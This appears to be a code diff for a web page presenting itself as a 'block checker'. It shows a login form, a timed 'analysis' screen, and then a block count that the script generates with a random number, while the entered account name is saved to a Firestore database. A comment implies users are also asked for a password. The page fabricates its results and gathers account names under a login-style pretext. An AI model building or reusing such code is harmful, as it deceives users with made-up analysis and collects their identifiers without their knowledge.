@@ -245,7 +245,8 @@
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
-import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+import { getFirestore, collection, addDoc, serverTimestamp } 
+from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
@@ -258,25 +259,44 @@ const firebaseConfig = {
 };
 
 const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
+const db = getFirestore(app);
 
-document.getElementById("sendBtn").addEventListener("click", async () => {
-  const username = document.getElementById("username").value;
-  const randomBlockCount = Math.floor(Math.random() * 20);
+const loginForm = document.getElementById("login-form");
+const loginScreen = document.getElementById("login-screen");
+const analysisScreen = document.getElementById("analysis-screen");
+const resultScreen = document.getElementById("result-screen");
+const blockCountEl = document.getElementById("block-count");
+const btnRetry = document.getElementById("btn-retry");
 
-  await addDoc(collection(db, "blockchecker"), {
-    username: username,
-    blockCount: randomBlockCount,
-    createdAt: serverTimestamp()
-  });
+loginForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
 
-    btnRetry.addEventListener('click', function() {
-      // 結果画面を隠してログイン画面に戻す（数値は保持される）
-      resultScreen.style.display = 'none';
-      loginScreen.style.display = 'block';
-      // フォームをリセット
-      loginForm.reset();
+  const account = document.getElementById("account").value;
+
+  // パスワードは保存しない（安全）
+  const randomBlockCount = Math.floor(Math.random() * 20) + 1;
+
+  loginScreen.style.display = "none";
+  analysisScreen.style.display = "block";
+
+  setTimeout(async () => {
+
+    await addDoc(collection(db, "blockchecker"), {
+      username: account,
+      blockCount: randomBlockCount,
+      createdAt: serverTimestamp()
     });
-  </script>
-</body>
-</html>
+
+    analysisScreen.style.display = "none";
+    resultScreen.style.display = "block";
+    blockCountEl.textContent = randomBlockCount;
+
+  }, 2000);
+});
+
+btnRetry.addEventListener("click", () => {
+  resultScreen.style.display = "none";
+  loginScreen.style.display = "block";
+  loginForm.reset();
+});
+</script>
